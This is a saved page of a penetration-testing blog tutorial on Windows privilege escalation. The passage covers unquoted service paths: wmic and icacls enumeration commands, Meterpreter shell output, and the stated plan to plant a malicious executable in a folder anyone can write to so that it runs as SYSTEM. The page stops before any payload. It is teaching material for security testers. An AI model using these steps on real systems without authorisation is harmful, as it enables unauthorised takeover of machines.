<!DOCTYPE html>
<!-- saved from url=(0073)https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ -->
<html class="no-js" lang="en-US" slick-uniqueid="3"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="">
<script async="" src="./Windows Privilege Escalation Methods_files/analytics.js.download"></script><script src="./Windows Privilege Escalation Methods_files/0I43Bxg6NSCFiP6ZrmEK6USGESM.js.download"></script><script src="./Windows Privilege Escalation Methods_files/1TvIEVAY9L_dEaYOUISH6JZQX-g.js.download"></script><link rel="profile" href="http://gmpg.org/xfn/11">
<title>Windows Privilege Escalation Methods for Pentesters – Pentest Blog</title>
<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="dns-prefetch" href="https://s.w.org/">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Feed" href="https://pentest.blog/feed/">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Comments Feed" href="https://pentest.blog/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="Pentest Blog » Windows Privilege Escalation Methods for Pentesters Comments Feed" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/feed/">
<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentest.blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.1"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script><script src="./Windows Privilege Escalation Methods_files/wp-emoji-release.min.js.download" type="text/javascript" defer=""></script>
<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>

<style>

        .sc_team_single_member .sc_single_side .social span {
            background: ;
        }

    </style>

<style>

        .grid#sc_our_team .sc_team_member .sc_team_member_name,
        .grid#sc_our_team .sc_team_member .sc_team_member_jobtitle {
            background: ;
        }

        .grid#sc_our_team .sc_team_member {
            padding: 0px !important;
        }

    </style>

<style>

        .grid_circles#sc_our_team .sc_team_member .sc_team_member_jobtitle,
        .grid_circles#sc_our_team .sc_team_member .sc_team_member_name {
            background: ;
        }

        .grid_circles#sc_our_team .sc_team_member {
            margin: 0px;
        }

    </style>

<style>

        .grid_circles2#sc_our_team .sc_team_member {
            margin: 0px;
        }

    </style>
<link rel="stylesheet" id="ots-common-css" href="./Windows Privilege Escalation Methods_files/common.css" type="text/css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./Windows Privilege Escalation Methods_files/style.min.css" type="text/css" media="all">
<link rel="stylesheet" id="ots-widget-css" href="./Windows Privilege Escalation Methods_files/widgets.css" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-bootstrap-css" href="./Windows Privilege Escalation Methods_files/bootstrap.min.css" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-icons-css" href="./Windows Privilege Escalation Methods_files/fontawesome-all.min.css" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-fonts-css" href="./Windows Privilege Escalation Methods_files/css" type="text/css" media="all">
<link rel="stylesheet" id="sparkling-style-css" href="./Windows Privilege Escalation Methods_files/style.css" type="text/css" media="all">
<link rel="stylesheet" id="enlighter-local-css" href="./Windows Privilege Escalation Methods_files/EnlighterJS.min.css" type="text/css" media="all">
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/jquery.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/jquery-migrate.min.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/bootstrap.min.js.download"></script>
<script type="text/javascript" src="./Windows Privilege Escalation Methods_files/functions.js.download"></script>
<link rel="https://api.w.org/" href="https://pentest.blog/wp-json/">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pentest.blog/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://pentest.blog/wp-includes/wlwmanifest.xml">
<link rel="prev" title="Art of Anti Detection 2 – PE Backdoor Manufacturing" href="https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/">
<link rel="next" title="Unexpected Journey into the AlienVault OSSIM/USM During Engagement" href="https://pentest.blog/unexpected-journey-into-the-alienvault-ossimusm-during-engagement/">
<meta name="generator" content="WordPress 5.2.1">
<link rel="canonical" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">
<link rel="shortlink" href="https://pentest.blog/?p=454">
<link rel="alternate" type="application/json+oembed" href="https://pentest.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentest.blog%2Fwindows-privilege-escalation-methods-for-pentesters%2F">
<link rel="alternate" type="text/xml+oembed" href="https://pentest.blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentest.blog%2Fwindows-privilege-escalation-methods-for-pentesters%2F&amp;format=xml">
<meta name="twitter:card" value="summary_large_image">
<meta name="twitter:site" value="@pentestblog">
<meta name="twitter:creator" value="@pentestblog">
<meta name="twitter:title" value="Windows Privilege Escalation Methods for Pentesters">
<meta name="twitter:description" value="Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you’ll run getsystem to escalate your privileges. But what if it fails? Don’t panic. There are still some techniques you can try. Unquoted Service Paths Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation [...]">
<meta name="twitter:image" value="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi.jpg">
<meta property="og:title" content="Windows Privilege Escalation Methods for Pentesters">
<meta property="og:type" content="article">
<meta property="og:image" content="https://pentest.blog/wp-content/uploads/taking-down-windows-nazi.jpg">
<meta property="og:url" content="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">
<meta property="og:description" content="Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you’ll run getsystem to escalate your privileges. But what if it fails? Don’t panic. There are still some techniques you can try. Unquoted Service Paths Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation [...]">
<meta property="og:site_name" content="Pentest Blog">
<style type="text/css">.entry-content {font-family: Tahoma, Geneva;}.entry-content {font-size:15px}</style> <style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
<style type="text/css">
				.navbar > .container .navbar-brand {
			color: #dadada;
		}
		</style>
<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="32x32">
<link rel="icon" href="https://pentest.blog/wp-content/uploads/logo-favicon.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="https://pentest.blog/wp-content/uploads/logo-favicon.png">
<meta name="msapplication-TileImage" content="https://pentest.blog/wp-content/uploads/logo-favicon.png">
<style type="text/css" id="wp-custom-css">
			#secondary .widget a {
    color: #636467;
}		</style>
<link rel="stylesheet" href="data:text/css;charset=utf-8;base64,Y2xvdWRmbGFyZS1hcHBbYXBwPSJhLWJldHRlci1icm93c2VyIl0gewogIGRpc3BsYXk6IGJsb2NrOwogIGJhY2tncm91bmQ6ICM0NTQ4NGQ7CiAgY29sb3I6ICNmZmY7CiAgbGluZS1oZWlnaHQ6IDEuNDU7CiAgcG9zaXRpb246IGZpeGVkOwogIHotaW5kZXg6IDkwMDAwMDAwOwogIHRvcDogMDsKICBsZWZ0OiAwOwogIHJpZ2h0OiAwOwogIHBhZGRpbmc6IC41ZW0gMWVtOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOwogICAgIC1tb3otdXNlci1zZWxlY3Q6IG5vbmU7CiAgICAgIC1tcy11c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICAgIHVzZXItc2VsZWN0OiBub25lOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImEtYmV0dGVyLWJyb3dzZXIiXVtkYXRhLXZpc2liaWxpdHk9ImhpZGRlbiJdIHsKICBkaXNwbGF5OiBub25lOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImEtYmV0dGVyLWJyb3dzZXIiXSBjbG91ZGZsYXJlLWFwcC1tZXNzYWdlIHsKICBkaXNwbGF5OiBibG9jazsKfQoKY2xvdWRmbGFyZS1hcHBbYXBwPSJhLWJldHRlci1icm93c2VyIl0gYSB7CiAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7CiAgY29sb3I6ICNlYmViZjQ7Cn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iYS1iZXR0ZXItYnJvd3NlciJdIGE6aG92ZXIsCmNsb3VkZmxhcmUtYXBwW2FwcD0iYS1iZXR0ZXItYnJvd3NlciJdIGE6YWN0aXZlIHsKICBjb2xvcjogI2RiZGJlYjsKfQoKY2xvdWRmbGFyZS1hcHBbYXBwPSJhLWJldHRlci1icm93c2VyIl0gY2xvdWRmbGFyZS1hcHAtY2xvc2UgewogIGRpc3BsYXk6IGJsb2NrOwogIGN1cnNvcjogcG9pbnRlcjsKICBmb250LXNpemU6IDEuNWVtOwogIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICByaWdodDogLjRlbTsKICB0b3A6IC4zNWVtOwogIGhlaWdodDogMWVtOwogIHdpZHRoOiAxZW07CiAgbGluZS1oZWlnaHQ6IDE7Cn0KCmNsb3VkZmxhcmUtYXBwW2FwcD0iYS1iZXR0ZXItYnJvd3NlciJdIGNsb3VkZmxhcmUtYXBwLWNsb3NlOmFjdGl2ZSB7CiAgLXdlYmtpdC10cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMXB4KTsKICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgxcHgpOwp9CgpjbG91ZGZsYXJlLWFwcFthcHA9ImEtYmV0dGVyLWJyb3dzZXIiXSBjbG91ZGZsYXJlLWFwcC1jbG9zZTpob3ZlciB7CiAgb3BhY2l0eTogLjllbTsKICBjb2xvcjogI2ZmZjsKfQo="><script async="" type="text/javascript" src="./Windows Privilege Escalation Methods_files/count.js.download"></script><script type="text/javascript" async="" src="./Windows Privilege Escalation Methods_files/embed.js.download"></script><link rel="preload" as="style" href="https://c.disquscdn.com/next/embed/styles/lounge.04c66beca3bb80cc0a55c3a1190bb412.css"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/common.bundle.5e2845671155c097129ebd8a2aeb308d.js"><link rel="preload" as="script" href="https://c.disquscdn.com/next/embed/lounge.bundle.a3fbbd565dcf205a18f6e93f1bb93bdf.js"><link rel="preload" as="script" href="https://disqus.com/next/config.js"></head>
<body class="post-template-default single single-post postid-454 single-format-standard group-blog">
<a class="sr-only sr-only-focusable" href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/#content">Skip to main content</a>
<div id="page" class="hfeed site">
<header id="masthead" class="site-header" role="banner">
<nav class="navbar navbar-default 
		" role="navigation">
<div class="container">
<div class="row">
<div class="site-navigation-inner col-sm-12">
<div class="navbar-header">
<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
<span class="sr-only">Toggle navigation</span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<div id="logo">
<a href="https://pentest.blog/"><img src="./Windows Privilege Escalation Methods_files/pentestblog-color-e1508706802866.png" height="67" width="280" alt="Pentest Blog"></a>
</div>
</div>
<div class="collapse navbar-collapse navbar-ex1-collapse"><ul id="menu-header-menu" class="nav navbar-nav"><li id="menu-item-1061" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1061"><a href="https://pentest.blog/category/advisories/">Advisories</a></li>
<li id="menu-item-105" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-105"><a href="https://pentest.blog/category/operating-system/">Operating System</a></li>
<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="https://pentest.blog/category/application-security/">Application Security</a></li>
<li id="menu-item-11" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-11"><a href="https://pentest.blog/category/network/">Network</a></li>
<li id="menu-item-106" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-106"><a href="https://pentest.blog/category/tools/">Tools</a></li>
<li id="menu-item-991" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-991"><a href="https://pentest.blog/article-series/">Article Series</a></li>
<li id="menu-item-14" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14"><a href="https://pentest.blog/about-us/">About Us</a></li>
</ul></div> </div>
</div>
</div>
</nav>
</header>
<div id="content" class="site-content">
<div class="top-section">
</div>
<div class="container main-content-area">
<div class="row side-pull-left">
<div class="main-content-inner col-sm-12 col-md-8">
<div id="primary" class="content-area">
<main id="main" class="site-main" role="main">
<article id="post-454" class="post-454 post type-post status-publish format-standard has-post-thumbnail hentry category-operating-system tag-privilege-escalation tag-windows">
<img width="750" height="410" src="./Windows Privilege Escalation Methods_files/taking-down-windows-nazi-750x410.jpg" class="single-featured wp-post-image" alt=""> <div class="post-inner-content">
<header class="entry-header page-header">
<h1 class="entry-title ">Windows Privilege Escalation Methods for Pentesters</h1>
<div class="entry-meta">
<span class="posted-on"><i class="fa fa-calendar-alt"></i> <a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" rel="bookmark"><time class="entry-date published" datetime="2017-01-18T21:13:41+03:00">January 18, 2017</time><time class="updated" datetime="2017-01-30T17:59:12+03:00">January 30, 2017</time></a></span><span class="byline"> <i class="fa fa-user"></i> <span class="author vcard"><a class="url fn n" href="https://pentest.blog/author/gokhan-sagoglu/">Gokhan Sagoglu</a></span></span>
<span class="cat-links"><i class="fa fa-folder-open"></i>
<a href="https://pentest.blog/category/operating-system/" rel="category tag">Operating System</a> </span>
</div>
</header>
<div class="entry-content">
<p>Imagine that you have gotten a low-priv Meterpreter session on a Windows machine. Probably you’ll run <em>getsystem</em>&nbsp;to escalate your privileges. But what if it fails?</p>
<p>Don’t panic. There are still some techniques you can try.</p>
<p><span id="more-454"></span></p>
<h3>Unquoted Service Paths</h3>
<p>Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation marks and contains space.</p>
<p>To identify these unquoted services you can run this command on Windows Command Shell:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">wmic service get name,displayname,pathname,startmode |findstr /i </span><span class="st0">"Auto"</span><span class=""> |findstr /i /v </span><span class="st0">"C:\Windows\\"</span><span class=""> |findstr /i /v </span><span class="st0">""</span><span class="">"</span></li></ol><pre style="display: none;">wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>All services with unquoted executable paths will be listed:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" data-enlighter-highlight="7,9" style="display: none;">meterpreter &gt; shell
Process 4024 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
Vulnerable Service                                      Vulnerable Service                   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe                   Auto       

C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">4024</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">1</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\Desktop&gt;wmic service get name,displayname,pathname,startmode |findstr /i </span><span class="st0">"Auto"</span><span class=""> |findstr /i /v </span><span class="st0">"C:\Windows\\"</span><span class=""> |findstr /i /v </span><span class="st0">""</span><span class="">"</span></li><li class=" even"><span class="">wmic service get name,displayname,pathname,startmode |findstr /i </span><span class="st0">"Auto"</span><span class=""> |findstr /i /v </span><span class="st0">"C:\Windows\\"</span><span class=""> |findstr /i /v </span><span class="st0">""</span><span class="">"</span></li><li class="specialline odd"><span class="">Vulnerable Service                                      Vulnerable Service                   C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder\A Subfolder\Executable.exe                   Auto       </span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Users\testuser\Desktop&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 4024 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\Desktop&gt;wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
Vulnerable Service                                      Vulnerable Service                   C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe                   Auto       

C:\Users\testuser\Desktop&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>If you look at the registry entry&nbsp;for this service with Regedit you can see the&nbsp;<strong>ImagePath</strong>&nbsp;value is:<br>
<strong>C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe<br>
</strong></p>
<p>It should be like this:<br>
<strong>“C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe”</strong></p>
<p><img class="alignnone wp-image-486" src="./Windows Privilege Escalation Methods_files/unquoted_regedit-300x105.png" alt="" width="843" height="295" srcset="https://pentest.blog/wp-content/uploads/unquoted_regedit-300x105.png 300w, https://pentest.blog/wp-content/uploads/unquoted_regedit-768x269.png 768w, https://pentest.blog/wp-content/uploads/unquoted_regedit.png 843w" sizes="(max-width: 843px) 100vw, 843px"></p>
<p>When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:</p>
<blockquote><p>C:\Program.exe<br>
C:\Program Files.exe<br>
C:\Program Files (x86)\Program.exe<br>
C:\Program Files (x86)\Program Folder\A.exe<br>
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe</p></blockquote>
<p>This vulnerability&nbsp;is caused by the <em>CreateProcess</em> function in Windows operating systems. For more information click read <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx">this article</a>.</p>
<p>If we can drop&nbsp;our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as&nbsp;SYSTEM. But we should have&nbsp;necessary&nbsp;privileges on one of these folders.</p>
<p>In order to check the permissions of a folder,&nbsp;we can use built-in Windows tool, icals. Let’s check permissions for <em>C:\Program Files (x86)\Program Folder</em> folder:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">meterpreter &gt; shell
Process 1884 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder"
icacls "C:\Program Files (x86)\Program Folder"
C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
                                      NT SERVICE\TrustedInstaller:(I)(F)
                                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Administrators:(I)(F)
                                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Users:(I)(RX)
                                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\Program Folder&gt;
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">1884</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">4</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder&gt;icacls </span><span class="st0">"C:\Program Files (x86)\Program Folder"</span><span class=""></span></li><li class=" even"><span class="">icacls </span><span class="st0">"C:\Program Files (x86)\Program Folder"</span><span class=""></span></li><li class=" odd"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder Everyone:</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      NT SERVICE\TrustedInstaller:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                      NT SERVICE\TrustedInstaller:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      NT AUTHORITY\SYSTEM:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                      NT AUTHORITY\SYSTEM:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      BUILTIN\Administrators:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                      BUILTIN\Administrators:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      BUILTIN\Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">RX</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                      BUILTIN\Users:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">GR,GE</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      CREATOR OWNER:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">F</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">RX</span><span class="br0">)</span><span class=""></span></li><li class=" even"><span class="">                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:</span><span class="br0">(</span><span class="">I</span><span class="br0">)</span><span class="br0">(</span><span class="">OI</span><span class="br0">)</span><span class="br0">(</span><span class="">CI</span><span class="br0">)</span><span class="br0">(</span><span class="">IO</span><span class="br0">)</span><span class="br0">(</span><span class="">GR,GE</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Successfully processed </span><span class="nu0">1</span><span class=""> files; Failed processing </span><span class="nu0">0</span><span class=""> files</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Program </span><span class="kw1">Files</span><span class=""> </span><span class="br0">(</span><span class="">x86</span><span class="br0">)</span><span class="">\Program Folder&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 1884 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Program Folder&gt;icacls "C:\Program Files (x86)\Program Folder"
icacls "C:\Program Files (x86)\Program Folder"
C:\Program Files (x86)\Program Folder Everyone:(OI)(CI)(F)
                                      NT SERVICE\TrustedInstaller:(I)(F)
                                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Administrators:(I)(F)
                                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                      BUILTIN\Users:(I)(RX)
                                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

C:\Program Files (x86)\Program Folder&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>What a luck! As you can see, “Everyone” has full control on this folder.</p>
